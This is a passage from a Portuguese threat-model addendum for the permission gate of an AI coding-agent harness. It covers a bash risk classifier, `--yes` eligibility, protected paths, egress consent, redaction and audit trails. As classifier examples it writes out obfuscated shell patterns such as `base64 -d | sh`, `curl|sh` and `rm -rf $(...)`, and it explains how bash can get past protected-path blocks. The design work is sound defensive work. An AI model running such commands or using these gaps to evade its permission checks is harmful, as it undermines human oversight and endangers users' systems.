  `grants_efetivos = trust-ordered/interseção`. Nunca `grants = união`. Fonte
  do repo nunca amplia além do usuário-global. (T19)
- **R5 (rede default-deny + evento pré-gravado + residual do provedor).** Só o
  provedor configurado é pré-consentido; todo outro destino nega sem
  consentimento; Egress Event redigido é escrito **antes** de a chamada
  prosseguir; **não afirmar** que o canal do provedor está gated (residual Fase 0
  T5/T7). (T20)
- **R6 (conjunto de sinks de redação fechado + redigir-antes-de-persistir).**
  Sinks = {transcrito TUI, notify/reason de bloqueio, audit trail, session JSONL,
  export futuro, erro re-lançado/`reason`}; cada um redige independente, por um
  choke por caminho de saída; redação roda antes da 1ª escrita durável e antes de
  todo egress. (T21, T22)
- **R7 (não over-claim + containment do `bash` pelo classifier).** Hard-block de
  protected-path vale só para `write`/`edit`; `bash` alcançando protected-path é
  responsabilidade do classifier (piso `high` / `critical` = negado); o produto
  **não afirma** que config/policy/audit são hard-protected enquanto `bash` está
  habilitado sem sandbox. (T23)
- **R8 (`--yes` elegibilidade fail-closed).** `--yes` só suprime o `confirm` de
  uma decisão já-ALLOW-com-aprovação, provadamente contida, tier ≤ `medium`.
  DENY / protected-path / `high`/`critical` / rede-não-consentida / não-provado
  ⇒ não-elegível → exige-humano ou nega. `--yes` nunca é *a razão* de um
  protected-path/`critical` executar. (T24)
- **R9 (audit trail: protegido + append-only + fail-closed-write + redigido +
  local).** Protected-path (write/edit + bash-`critical`), `O_APPEND`, redigido,
  0600, gitignored; falha de escrita de auditoria nega a ação auditada.
  Cripto-integridade é Fase 4 (residual declarado). (T25, T26)
- **R10 (resolução de nível fail-closed preservada no refactor de 5 níveis).**
  Tool sem nível explícito/inequívoco → nível Security → nega sem política; o
  default-deny terminal (FR-22) sobrevive como o último branch. (T27)

---

## 5. Lacunas reportadas de volta ao Gate 2 (a spec não cobriu)

O Gate 3 é iterativo com o Gate 2/4. Estas lacunas foram encontradas ao modelar
as ameaças e **precisam voltar à spec** (`gate2-spec-fase2.md`) antes do Gate 5:

- **GAP-A (FR-5 insuficiente — T17).** FR-5 só cobre ofuscação quando o **verbo
  perigoso está literalmente presente** (`rm -rf $(...)`). Não cobre o caso
  ENCODED (`base64 -d | sh`, `eval "$(...)"`, `curl|sh`) onde o verbo não aparece.
  FR-5 deve pisar em `high` na **construção de indireção-para-interpretador**, não
  só em verbos reconhecidos.
- **GAP-B (grants de `policy.json` não modelados — T18/T19).** A spec trata
  `policy.json` como confiável (FR-3 auto-aprova). BR-5 fixa união **só para
  protected-paths (restrições)**; é **silente** sobre como GRANTS (allowlist
  auto-aprovar, consentir rede) são confiados e mesclados. Adicionar: grants de
  projeto exigem trust-on-first-use + tetos; merge de grants é
  trust-ordered/interseção, nunca união.
- **GAP-C (enumeração de sinks incompleta — T21).** FR-12/13/14 nomeiam audit
  trail, transcrito e export; **faltam** (i) o **session JSONL** (store persistente
  da Fase 1 que captura I/O de tool em claro) e (ii) o caminho
  **`ctx.ui.notify`/reason de bloqueio** e **erros re-lançados** (`fail-closed.ts`
  `reason`). BR-12 deve nomear os seis sinks explicitamente.
- **GAP-D (protected-path ilusório para `bash` — T23).** FR-9/FR-17/BR-4 afirmam
  proteção que só vale para `write`/`edit`; `bash` passa por baixo
  (`permission-gate.ts` 97–102 não chama `evaluateToolPath`). A spec deve (i)
  exigir que o classifier extraia e cheque alvos de escrita/remoção do `bash`, e
  (ii) rebaixar a afirmação para "protegido contra write/edit; para bash, gated
  por classifier+aprovação, **não** hard-block — residual sem-sandbox aceito".
- **GAP-E (pergunta em aberto #5 deve ser resolvida na direção segura — T22).**
  "Redigir na escrita vs. no render" **não** é uma escolha livre de Gate 4: o
  requisito de segurança é **redigir-antes-de-persistir/antes-de-egress**. Fixar
  na spec como requisito, não como pergunta aberta.
- **GAP-F (ordem do Egress Event — T20, menor).** FR-7 não fixa que o evento é
  escrito **antes** de a chamada de rede prosseguir. Fixar pré-gravação (BR-6
  estendido).

---

## 6. Secure defaults acrescentados na Fase 2 (append aos §5 Fase 0 / §3 Fase 1)

Os itens 1–13 (Fase 0 §5 + Fase 1 §3) permanecem. A Fase 2 acrescenta:

14. **Todo `bash` é classificado antes da decisão; incerteza/ofuscação = tier
    mais alto; indireção-p/-interpretador pisa em `high`** (R1/T17).
15. **`--yes` é fail-closed na elegibilidade** — só suprime `confirm` de decisão
    provadamente contida e tier ≤ medium; nunca alcança protected-path/`critical`
    (R8/T24).
16. **`policy.json` split-trust** — restrições incondicionais e unidas; grants
    só por trust-on-first-use + tetos (R3/T18); merge de grants é
    interseção/trust-ordered (R4/T19).
17. **Rede default-deny exceto o provedor configurado; Egress Event redigido
    pré-gravado** (R5/T20).
18. **Redação em todos os seis sinks, no limite externo, antes de persistir/
    egress** (R6/T21/T22).
19. **Audit trail protected-path + append-only + fail-closed-write + redigido +
    0600 + gitignored** (R9/T25/T26).
20. **Resolução de nível fail-closed** — tool sem nível → Security → nega;
    default-deny terminal preservado (R10/T27).

**Aplicação (Pi):** todos realizáveis sobre os primitivos já existentes —
`evaluateToolPath`/`workspace-policy.ts` (protected-paths, itens 16/19),
`fail-closed.ts` (itens 14/15/17/20), `terminal-sanitize.ts` + os matchers de
`secret-detection.ts` reusados no pipeline de redação (item 18),
`PermissionGateDecision`/`onDecision` persistido (item 19). **Nenhum exige fork do
Pi.** O item 14 (classifier) e o 18 (redação) são código novo first-party; o
resto é reuso/extensão.

---

## 7. Critérios de saída deste adendo (Fase 2)

- [x] Delta de superfície das 7 superfícies novas/estendidas modelado sobre o DFD
      Fase 0/1, sem re-litigar T1–T16 (§1).
- [x] Ameaças novas T17–T27 enumeradas, avaliadas (prob × impacto) e mitigadas
      com primitivo real; cada mitigação amarrada a uma regra vinculante (§2/§4).
- [x] Os 5 vetores do critério de saída do usuário cobertos explicitamente,
      inclusive o requisito de que o bypass de protected-path por `--yes` seja
      **estruturalmente** impossível (§3, T23/T24/R7/R8).
- [x] 10 regras vinculantes (R1–R10) entregues ao Gate 4 (§4); 6 secure defaults
      acrescentados (14–20, §6).
- [x] 6 lacunas (GAP-A…F) reportadas de volta ao Gate 2 — a spec não é tratada
      como completa (§5).
- [x] Grounding por livro+seção; lacunas de cobertura (classificação/ofuscação de
      comando; TOCTOU de symlink) **reportadas honestamente**, não forçadas (§8).
- [ ] **Aprovação do usuário** — em modo autônomo (`/cdt-auto`), sem checkpoint
      humano por gate; a decisão é registrada no journal (`cdt journal add`) como
      o registro oficial do gate.

**Findings críticos/altos em aberto ao fim do gate:** nenhum *não mitigado por
regra*. Três P1 são **estruturais e devem constar como restrição de arquitetura,
não como bug a corrigir depois**: **T23** (`bash` fura protected-path — a garantia
degrada honestamente, não é hard-block), **T24** (`--yes` fail-closed é a
condição de o vetor #2 ser fechado) e **T17** (classifier só pode subir tier). O
residual aceito e **declarado, não escondido**: (a) o canal do provedor de modelo
continua sendo exfil não-gated (Fase 0 T5/T7); (b) cripto-integridade do audit
trail é Fase 4; (c) TOCTOU de symlink (spec edge #5) permanece sem mitigação nova
— nomeado no §8 abaixo. Herdados abertos (Fase 0/1) e **fora de escopo** desta
fase por Non-goal: T4 (código de 3os), subagentes, MCP, modo autônomo de produto.

---

## 8. Grounding (biblioteca) — consultas desta sessão

Backend saudável. Consultas rodadas de `C:\development\source\projects\conductor`
via `cdt library "<pergunta>" --gate 3`. **Postura honesta:** o corpus cobre
**forte** os eixos least-privilege/blast-radius, segredos-fora-de-logs e
taint→sink; cobre **fraco** os eixos específicos de classificação/ofuscação de
comando de shell e de TOCTOU/race — reportado, não forçado (mesma disciplina das
Fases 0/1 com T5/T10/T14/T16).

1. **Least privilege / blast radius / merge de política / trust-ordered**
   (T18, T19, T23, T27) → **Secure and Reliable Systems Design — Complete
   Professional Guide** §3.3 (scope/duration/failure domains; zero-trust: "network
   location grants no authority"), §3.12 ("the reachable authority has never been
   enumerated" — âncora direta do trust-on-first-use e do merge interseção),
   §3.13 ("least privilege and bounded blast radius ... narrow purpose-built APIs
   instead of ambient root ... require multi-party authorization ... route
   privileged access through an audit trail"). Top **0.648** — match forte.
   Reforçado por **Security Engineering Principles** §1.2/§1.9 (defense in depth +
   least privilege; "assume each layer can fail").

2. **Fail-closed / secure-by-default** (T24, T27, e a regra-mãe reusada) →
   **Security Engineering Principles — Complete Professional Guide** §2.2 (secure
   by default; brechas exploram defaults inseguros), §2.5 (timeout-como-allow é o
   exemplo canônico de conveniência que vira bypass de controle — âncora de T24),
   §2.9 ("Errors/uncertainty deny access"), §2.12 (o default seguro é opt-out; e
   "egress destinations depend on the deployment, not the product" — âncora do
   consentimento-por-deployment de T18/T20 em vez de proibição). Top **0.602**.

3. **Redação/segredos-fora-de-logs / audit trail** (T21, T22, T25, T26) →
   **OWASP ASVS 4.0.3** V6.4 Secret Management ("Logging sensitive information is
   dangerous — the logs become classified themselves ... no credentials
   (including session tokens), sensitive or personally identifiable") e V7.1/V7.2
   Log Content/Processing (logs de auditoria claros, protegidos, analisáveis). Top
   **0.611**. Reforçado por **Secure Code Review** §2.2/§2.5 (taint source→sink —
   redigir **em cada sink**) e **Web Application Security** §2.7 (auto-encoding de
   saída não-confiável, o mesmo frame do XSS aplicado a cada sink).

4. **Egress / consentimento de rede / default-deny** (T20) → **Security
   Engineering Principles** §2.12 (egress depende do deployment → consentimento
   explícito); **Penetration Testing — Complete Professional Guide** §16.2/§16.11
   ("bind to localhost; default-deny firewall"); **Privacy Engineering — Complete
   Professional Guide** §1.5 (private-by-default: "Identifiable tracking: OFF by
   default, ON only with explicit opt-in consent + purpose"). Top **0.602**.

5. **Command injection / source→sink** (contexto de T17, T23) → **Penetration
   Testing** §8.4 (arquitetura source→sink: `Source → flow → Sink: exec`, guard =
   "parameterization/allowlist/sandbox" que a ofuscação **quebra**), §8.2/§8.11
   (command injection = execução no host). Top **0.626**.

**Lacunas de cobertura reportadas (não forcei citação):**
- **Classificação de risco / ofuscação de comando de shell** (T17): a biblioteca
  **não tem capítulo dedicado**; consulta desta sessão retornou material de
  injection/supply-chain genérico (top 0.626). Ancorado por source→sink +
  allowlist-sobre-denylist + fail-closed — mesma postura da Fase 0 com T5.
- **TOCTOU / race de symlink** (spec edge #5): **sem capítulo dedicado**; consulta
  desta sessão retornou o exemplo de path-traversal por taint→sink (Secure Code
  Review §2.5) e a decomposição em trust-domains (§3.13), top 0.583 — nada
  específico sobre a janela check→use. Ancorado por: a canonicalização real-path
  (Fase 0 T1/T2) fecha a *checagem*, mas a **janela** entre checagem e execução
  permanece um residual sem mitigação nova nesta fase (exigiria abrir-por-fd/
  re-checar-no-uso ou sandbox — fora de escopo). **Nomeado como residual aberto,
  não assumido coberto** — mesma disciplina do T10 (Fase 0) e T16 (Fase 1).
- **Integridade criptográfica de audit trail** (T25): explicitamente Fase 4 (spec
  §3 Non-goal); o audit trail da Fase 2 é append-only+protegido, não
  tamper-evident por cripto — residual declarado.

**Reconciliação Gate 3 ↔ Gate 4 (protocolo iterativo):** este adendo entrega 10
regras vinculantes (§4) e 6 secure defaults (§6) ao ADR da Fase 2 (Gate 4, ainda
não escrito). Se o Gate 4 expuser uma fronteira nova (ex.: onde o Command
Classifier ou o Redaction Pipeline moram como pacote, se o audit trail reusa o
`SessionManager` JSONL ou um store próprio), **voltar a este Gate 3** antes de
avançar. As 6 lacunas do §5 devem voltar ao Gate 2 antes do Gate 5 (test-first).
</content>
</invoke>
